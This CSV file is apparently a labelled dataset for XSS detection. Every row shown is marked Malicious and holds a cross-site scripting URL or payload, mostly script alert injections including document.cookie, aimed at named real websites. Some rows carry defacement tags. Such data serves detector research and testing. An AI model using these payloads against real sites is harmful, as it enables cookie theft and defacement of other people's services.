Payloads,Class,decoded,executed,parser_changed
http://www.dancesportbc.com/content.php?sectionid=3&amp;contentid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scri<br>pt&gt;,Malicious,"http://www.dancesportbc.com/content.php?sectionid=3&contentid=""><script>alert(document.cookie)</script>",True,True
http://www.richardhumphrys.com.au/stock/search.php?keyword=%22%3e%3cscript%3ealert(1)%3c/script%3e,Malicious,"http://www.richardhumphrys.com.au/stock/search.php?keyword=""><script>alert(1)</script>",True,True
http://www.huracan.guatemala.gob.gt/discurso.php?codigo=1154&amp;tipo=%22%3e%3cscript%3ealert(/xssed!/);<br>%3c/script%3e,Malicious,"http://www.huracan.guatemala.gob.gt/discurso.php?codigo=1154&tipo=""><script>alert(/xssed!/);</script>",True,True
http://ax.behyab.com/igallery34/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narco<br>ticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://ax.behyab.com/igallery34/igallery.asp?d=""><script>alert('xss')</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://bcsia.ksg.harvard.edu/?program=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://bcsia.ksg.harvard.edu/?program=""><script>alert(""maxwel"")</script>",True,True
http://www.juranek.pl/portfolio/index.php?c=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.juranek.pl/portfolio/index.php?c=""><script>alert(document.cookie)</script>",True,True
http://icsuttoncoldfield.icnetwork.co.uk/search.cfm?query=%22%3e%3cscript%3ealert(/xss%20-%20thedefa<br>ced.org/)%3c/script%3e%3cp,Malicious,"http://icsuttoncoldfield.icnetwork.co.uk/search.cfm?query=""><script>alert(/xss - thedefaced.org/)</script><p",True,True
http://mobs-law.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious,http://mobs-law.com/register.php?ref='><script>alert(document.cookie);</script>,True,True
http://liberdadenautica.com.br/site/miniatura.php?id=80889895&amp;foto=54%22%3e%3cscript%3ealert%28docum<br>ent.cookie%29%3c/script%3e%3c,Malicious,"http://liberdadenautica.com.br/site/miniatura.php?id=80889895&foto=54""><script>alert(document.cookie)</script><",True,True
https://channel.pandasecurity.com/app/pages/partner%20program.aspx?language=%22%3e%3c%2fscript%3e%22%3e%27%3e%3cscript%3ealert%28%22arman%20ires%20digital%20boys%20underground%20http://xssed.com%22%29%3c%2fscript%3e,Malicious,"https://channel.pandasecurity.com/app/pages/partner program.aspx?language=""></script>"">'><script>alert(""arman ires digital boys underground http://xssed.com"")</script>",True,True
http://www.lifewithsherry.com/gallery/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;<br>&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.lifewithsherry.com/gallery/login.asp?folder=&n=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.nvidia.co.jp/content/driverdownload/download_confirmation_jp.asp?language=jp&amp;url=%22%3e%3<br>cscript%3ealert(/xss/)%3c/script%3e%3ca,Malicious,"http://www.nvidia.co.jp/content/driverdownload/download_confirmation_jp.asp?language=jp&url=""><script>alert(/xss/)</script><a",True,True
https://registration.sandbox.paypal.com/welcomepage.do?devcuserid=64wldypg2bbqy&amp;devclogin=%22%3e%3cs<br>cript%3ealert(%22i'm%20back%20-%20rstcenter.com%20-%20hackersblog.org%22)%3c/script%3e&amp;bundlecode=c3<br>&amp;country=us&amp;partner=paypal,Malicious,"https://registration.sandbox.paypal.com/welcomepage.do?devcuserid=64wldypg2bbqy&devclogin=""><script>alert(""i'm back - rstcenter.com - hackersblog.org"")</script>&bundlecode=c3&country=us&partner=paypal",True,True
http://www.gsmoffice.com/forum/redirector.php?url=%22%3e%3cscript%3ealert(2)%3c/script%3e,Malicious,"http://www.gsmoffice.com/forum/redirector.php?url=""><script>alert(2)</script>",True,True
http://www.free-host-directory.com/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;mar<br>quee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.free-host-directory.com/signinform.php?msg=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
"insert ""'><img src=vul onerror=alert('r007k17-w')> in the form",Malicious,"insert ""'><img src=vul onerror=alert('r007k17-w')> in the form",True,True
http://www.boulanger.fr/webapp/wcs/stores/servlet/catalogsearchresult?storeid=10001&amp;catalogid=10001&amp;<br>langid=-2&amp;searchterm=+%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(%22xss%22)%3b%3c%2fscript%3e%3cmarque<br>e+bgcolor%3d%22red%22%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e&amp;searchscope=&amp;x=11&amp;y=11,Malicious,"http://www.boulanger.fr/webapp/wcs/stores/servlet/catalogsearchresult?storeid=10001&catalogid=10001&langid=-2&searchterm= '""></title><script>alert(""xss"");</script><marquee bgcolor=""red""><h1>xss by xylitol</h1></marquee>&searchscope=&x=11&y=11",True,True
http://www.wen-tech.com/newsdisplay.asp?id=12&amp;name=%3cscript%3ealert(/st@r-gaz3r/)%3c/script%3e%3cma<br>rquee%3e%3ch1%3est@r-gaz3r%3c/h1%3e%3c/marquee%3e,Malicious,http://www.wen-tech.com/newsdisplay.asp?id=12&name=<script>alert(/st@r-gaz3r/)</script><marquee><h1>st@r-gaz3r</h1></marquee>,True,True
http://uncyclopedia.wikia.com/index.php?title=special%3asearch&search=+}%3c%2fstyle%3e%3cscript%3ea%3deval%3bb%3dalert%3ba%28b%28%2fxss%2f.source%29%29%3b%3c%2fscript%3e%3cmarquee+bgcolor%3d%22red%22%3e%3ch1%3exss3d+by+hari%3c%2fh1%3e%3c%2fmarquee%3e,Malicious,"http://uncyclopedia.wikia.com/index.php?title=special:search&search= }</style><script>a=eval;b=alert;a(b(/xss/.source));</script><marquee bgcolor=""red""><h1>xss3d by hari</h1></marquee>",True,True
http://www.itemlocator.net/scripts/cgiip.exe/wservice=ils3/webspeed/%22%3e%3cscript%3ealert%281337%2<br>9%3c/script%3e,Malicious,"http://www.itemlocator.net/scripts/cgiip.exe/wservice=ils3/webspeed/""><script>alert(1337)</script>",True,True
http://www.tomshardware.com.tr/community/showflat.m?cat=&amp;board=offtop&amp;number=210397&amp;page=4&amp;view=&quot;&gt;&lt;s<br>cript&gt;alert('cyber//www.warattack.org')&lt;/script&gt;,Malicious,"http://www.tomshardware.com.tr/community/showflat.m?cat=&board=offtop&number=210397&page=4&view=""><script>alert('cyber//www.warattack.org')</script>",True,True
http://www.szbti.gov.cn/download/test.php3?cx[][][][][][][][][][][][][][][][][][][][][][][][][][][][<br>][][][][][][][][][]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3c/script%3e,Malicious,"http://www.szbti.gov.cn/download/test.php3?cx[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]=""><script>alert(document.cookie)</script></script>",True,True
http://www.incil.com/incilbbs/check_user_id.php?user_id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;m<br>arquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.incil.com/incilbbs/check_user_id.php?user_id=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://www.misco.co.uk/applications/searchtools/search.asp?keywords=%22%3e%3c%73%63%72%69%70%74%3e%6<br>1%6c%65%72%74%28%22%41%6d%61%7a%65%64%3f%20%2d%20%53%74%75%61%72%74%79%22%29%3c%2f%73%63%72%69%70%74<br>%3e&amp;image1.x=0&amp;image1.y=0,Malicious,"http://www.misco.co.uk/applications/searchtools/search.asp?keywords=""><script>alert(""Amazed? - Stuarty"")</script>&image1.x=0&image1.y=0",True,True
http://www.ptonline.com/scripts/searchlibrarypt04.asp?zone=blm&amp;qt=mil%27%22%3e%3c/title%3e%3cscript%<br>3ealert(1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.ptonline.com/scripts/searchlibrarypt04.asp?zone=blm&qt=mil'""></title><script>alert(1337)</script>'""><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://www.schirmer.com/default.aspx?tabid=2428&amp;state_2889=1&amp;searchtype_2889=all&amp;searchtext_2889=%22<br>%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious,"http://www.schirmer.com/default.aspx?tabid=2428&state_2889=1&searchtype_2889=all&searchtext_2889=""><script>alert(document.cookie)</script>",True,True
http://www.superspor.com/detail.php?type=search&amp;frm_kategori=haber&amp;frm_text=&quot;&gt;&lt;h1&gt;by%20st@rext&lt;/h1&gt;&lt;<br>script&gt;alert(document.cookie)&lt;/script&gt;&lt;script&gt;alert('by%20st@rext')&lt;/script&gt;%3e%3cmarquee%3ewhitehat<br>%20forever%3c/marque%3e,Malicious,"http://www.superspor.com/detail.php?type=search&frm_kategori=haber&frm_text=""><h1>by st@rext</h1><script>alert(document.cookie)</script><script>alert('by st@rext')</script>><marquee>whitehat forever</marque>",True,True
http://www.chungkien.com/cart.php?a=add&amp;pid=%3e%22%3e%3cscript%20%0a%0d%3ealert(398817923059)%3b%3c/<br>script%3e,Malicious,"http://www.chungkien.com/cart.php?a=add&pid=>""><script 
>alert(398817923059);</script>",True,True
"http://filmtrailer.msn.se/index.php?module=filmnews&operation=""><script>alert(document.cookie)</script>",Malicious,"http://filmtrailer.msn.se/index.php?module=filmnews&operation=""><script>alert(document.cookie)</script>",True,True
http://www.fullsongs.net/ripmp3.php?url=&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(12)&lt;/script&gt;,Malicious,"http://www.fullsongs.net/ripmp3.php?url=""></script><script>alert(12)</script>",True,True
http://www.oceansurf.ca/gallery.php?id=16%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious,"http://www.oceansurf.ca/gallery.php?id=16""><script>alert(document.cookie)</script>",True,True
http://www.utsa.edu/identity/styleguide/q.cfm?stext=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.utsa.edu/identity/styleguide/q.cfm?stext=""><script>alert(""maxwel"")</script>",True,True
http://g2.wnd.com/index.php?fa=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious,"http://g2.wnd.com/index.php?fa=""><script>alert(/xss/)</script>",True,True
http://www.gentag.fr/code-barres/advanced_search_result.php?kw=/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;&amp;search_in_description=1&amp;x=13&amp;y=16,Malicious,"http://www.gentag.fr/code-barres/advanced_search_result.php?kw=/""><script>alert('xss byatm0n3r')</script>&search_in_description=1&x=13&y=16",True,True
http://local.newburyportnews.com/search.pg?q=%3cscript%3ealert(%22iblaze%22)%3c%2fscript%3e&amp;z=newbur<br>yport%2c+ma,Malicious,"http://local.newburyportnews.com/search.pg?q=<script>alert(""iblaze"")</script>&z=newburyport, ma",True,True
http://rankmyhack.com/login.php?r=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(<br>1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(<br>1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(<br>1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(<br>1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(<br>1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(<br>1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(<br>1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(<br>1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious,"http://rankmyhack.com/login.php?r=""><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script>",True,True
"<script>$=1,alert($)</script>",Malicious,"<script>$=1,alert($)</script>",True,True
http://www.fiat.com.br/br/servicos/assistencia24h_generico.jsp?idmodelo=&lt;script&gt;alert(&quot;xroot owned<br>you!&quot;)&lt;/script&gt;,Malicious,"http://www.fiat.com.br/br/servicos/assistencia24h_generico.jsp?idmodelo=<script>alert(""xroot ownedyou!"")</script>",True,True
http://www.nexths.it/v3/results.php?mv_order=category%2cbrand%2cinactive%2cdescrbreve&amp;mv_set_ordermo<br>de=&amp;mv_custom_search=toolbarsearch_profile&amp;mv_set_resultsmode=list&amp;text=%3cscript%3ealert(document.c<br>ookie)%3b%3c%2fscript%3e,Malicious,"http://www.nexths.it/v3/results.php?mv_order=category,brand,inactive,descrbreve&mv_set_ordermode=&mv_custom_search=toolbarsearch_profile&mv_set_resultsmode=list&text=<script>alert(document.cookie);</script>",True,True
http://www.fling.com/main.html?prg=1&amp;id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+na<br>rcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.fling.com/main.html?prg=1&id=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://ecotopia.co.uk/index.jsp?searchstr=%22%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%41%6d%<br>61%7a%65%64%3f%20%2d%20%53%74%75%61%72%74%79%22%29%3c%2f%73%63%72%69%70%74%3e,Malicious,"http://ecotopia.co.uk/index.jsp?searchstr=""><script>alert(""Amazed? - Stuarty"")</script>",True,True
http://www.ylw.mmtr.or.jp/~jmjoy/newsboard/newsboard.cgi?num=%3e%22%3e%3cscript%3ealert%28%27ins%20-<br>%20unkn0wn.eu%27%29%3c%2fscript%3e,Malicious,"http://www.ylw.mmtr.or.jp/~jmjoy/newsboard/newsboard.cgi?num=>""><script>alert('ins - unkn0wn.eu')</script>",True,True
http://alistdirectory.com/index.php?q=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious,"http://alistdirectory.com/index.php?q=""><script>alert(/xss/)</script>",True,True
http://dx.doi.org/(type=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://dx.doi.org/(type=""><script>alert(""maxwel"")</script>",True,True
http://www.republic.co.uk/bin/venda?ex=co_wizr-locayta&amp;template=wz_locayta&amp;pageno=1&amp;perpage=12&amp;colla<br>te=pdxtgndr%3abrand%3aivtype&amp;termorder=pdxtgndr%3abrand%3aivtype&amp;fieldrtype=type&amp;termtextrtype=invt&amp;<br>typertype=exact&amp;fieldpdxtgndr=pdxtgndr&amp;typepdxtgndr=exact&amp;termtextpdxtgndr=&amp;fieldbrand=brand&amp;typebra<br>nd=exact&amp;termtextbrand=&amp;fieldivtype=ivtype&amp;typeivtype=exact&amp;termtextivtype=&amp;typekeywordsearch=keywor<br>d&amp;termtextkeywordsearch=%3cscript%3ealert%28%22bl4ck%22%29%3c%2fscript%3e,Malicious,"http://www.republic.co.uk/bin/venda?ex=co_wizr-locayta&template=wz_locayta&pageno=1&perpage=12&collate=pdxtgndr:brand:ivtype&termorder=pdxtgndr:brand:ivtype&fieldrtype=type&termtextrtype=invt&typertype=exact&fieldpdxtgndr=pdxtgndr&typepdxtgndr=exact&termtextpdxtgndr=&fieldbrand=brand&typebrand=exact&termtextbrand=&fieldivtype=ivtype&typeivtype=exact&termtextivtype=&typekeywordsearch=keyword&termtextkeywordsearch=<script>alert(""bl4ck"")</script>",True,True
http://www.avcibayram.com/igallery34/login.asp?n=/igallery34/igallery.asp&amp;d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/<br>script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.avcibayram.com/igallery34/login.asp?n=/igallery34/igallery.asp&d=""><script>alert('xss')</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://ms129.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious,"http://ms129.mysearch.com/search/ggweb.jhtml?searchfor=""><script>alert(""maxwel"")</script>",True,True
http://nbcsports.resultspage.com/search?p=q&amp;ts=custom&amp;w=%3c/script%3e%3cscript%3ealert(document.cook<br>ie);%3c/script%3e%3cscript%3e//%20&amp;x=0&amp;y=0,Malicious,http://nbcsports.resultspage.com/search?p=q&ts=custom&w=</script><script>alert(document.cookie);</script><script>// &x=0&y=0,True,True
http://www.expressorder.ru/search.php?number=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(1337)%3c%2fscr<br>ipt%3e&amp;x=30&amp;y=16,Malicious,"http://www.expressorder.ru/search.php?number='""></title><script>alert(1337)</script>&x=30&y=16",True,True
https://www.ezbuyus.co.il/gobuy2.0/search.asp?searchstrings=hood&quot;&gt;&lt;script&gt;alert(&quot;bluemax&quot;)&lt;/script&gt;,Malicious,"https://www.ezbuyus.co.il/gobuy2.0/search.asp?searchstrings=hood""><script>alert(""bluemax"")</script>",True,True
http://crashtest.motori.it.msn.com/?idm=%22%3e%3c/noscript%3e%3cscript%3ealert(%22hacked%20by%20dark<br>_net%22)%3c/script%3e,Malicious,"http://crashtest.motori.it.msn.com/?idm=""></noscript><script>alert(""hacked by dark_net"")</script>",True,True
http://www.consumerfed.org/topics.cfm?section=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.consumerfed.org/topics.cfm?section=""><script>alert(""maxwel"")</script>",True,True
http://www.anbr.ru/search.php?search=%22%3e%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e&amp;x=1<br>6&amp;y=10,Malicious,"http://www.anbr.ru/search.php?search=""><script>alert(document.cookie)</script>&x=16&y=10",True,True
http://www.vattenfall.de/de/subscriptionform.xml?current-page=%2fde%2fpresse-aboservice.htm&amp;sendpage<br>url=presse-aboservice.htm&amp;subscriptionlist=3981c1acfe604763966a661c88fa1922.xml&amp;subscriptiontimestam<br>p=20%3a35%3a13%3a59&amp;action=subscribe&amp;subscribeheadline=anmeldung&amp;unsubscribeheadline=abmeldung&amp;first<br>_name_input=mandatory&amp;first_name=%22%3e%3cscript%3ealert%28document.cookie%29%3b%3c%2fscript%3e&amp;surn<br>ame_input=mandatory&amp;surname=&amp;telephone_input=visible&amp;telephone=&amp;fax_input=visible&amp;fax=&amp;company_input<br>=visible&amp;company=&amp;street_input=visible&amp;street=&amp;house_nr_input=visible&amp;house_nr=&amp;zip_code_input=visib<br>le&amp;zip_code=&amp;city_input=visible&amp;city=&amp;email_input=mandatory&amp;email=&amp;stf_categorylist=bergbau|+energie<br>politik|+gesellschaft%2fsport%2fkultur|+innovation+%26+umwelt|+netz%2fhandel%2fit&amp;categories_nr=1%3b<br>2%3b3%3b4%3b5&amp;subscription_link_text=schalten+sie+nun+ihr+abonnement+frei!&amp;unsubscription_link_text=<br>beenden+sie+jetzt+ihr+abonnement!&amp;leading_message_text=sie+haben+sich+f%c3%bcr+das+abonnement+von+ab<br>oservice+mit+folgenden+daten+registriert%3a&amp;trailing_message_text_subscription=zum+abbestellen+gen%c<br>3%bcgt+es%2c+ihre+e-mail-adresse+in+das+formular+unserer+internet-abo-seite+einzugeben+und+auf+%22ab<br>bestellen%22+zu+klicken.+ihre+daten+%c3%a4ndern+sie%2c+indem+sie+dort+ebenfalls+ihre+e-mail-adresse+<br>plus+die+neuen+daten+angeben.%3cbr%3e%3cbr%3ebeachten+sie+auch+unsere+hinweise+zum+datenschutz.&amp;trai<br>ling_message_text_unsubscription=ihre+daten+%c3%a4ndern+sie%2c+indem+sie+dort+ebenfalls+ihre+e-mail-<br>adresse+plus+die+neuen+daten+angeben.+%3cbr%3e%3cbr%3ebeachten+sie+auch+unsere+hinweise+zum+datensch<br>utz.&amp;absenden.x=64&amp;absenden.y=13&amp;absenden=submit,Malicious,"http://www.vattenfall.de/de/subscriptionform.xml?current-page=/de/presse-aboservice.htm&sendpageurl=presse-aboservice.htm&subscriptionlist=3981c1acfe604763966a661c88fa1922.xml&subscriptiontimestamp=20:35:13:59&action=subscribe&subscribeheadline=anmeldung&unsubscribeheadline=abmeldung&first_name_input=mandatory&first_name=""><script>alert(document.cookie);</script>&surname_input=mandatory&surname=&telephone_input=visible&telephone=&fax_input=visible&fax=&company_input=visible&company=&street_input=visible&street=&house_nr_input=visible&house_nr=&zip_code_input=visible&zip_code=&city_input=visible&city=&email_input=mandatory&email=&stf_categorylist=bergbau| energiepolitik| gesellschaft/sport/kultur| innovation & umwelt| netz/handel/it&categories_nr=1;2;3;4;5&subscription_link_text=schalten sie nun ihr abonnement frei!&unsubscription_link_text=beenden sie jetzt ihr abonnement!&leading_message_text=sie haben sich für das abonnement von aboservice mit folgenden daten registriert:&trailing_message_text_subscription=zum abbestellen genügt es, ihre e-mail-adresse in das formular unserer internet-abo-seite einzugeben und auf ""abbestellen"" zu klicken. ihre daten ändern sie, indem sie dort ebenfalls ihre e-mail-adresse plus die neuen daten angeben.<br><br>beachten sie auch unsere hinweise zum datenschutz.&trailing_message_text_unsubscription=ihre daten ändern sie, indem sie dort ebenfalls ihre e-mail-adresse plus die neuen daten angeben. <br><br>beachten sie auch unsere hinweise zum datenschutz.&absenden.x=64&absenden.y=13&absenden=submit",True,True
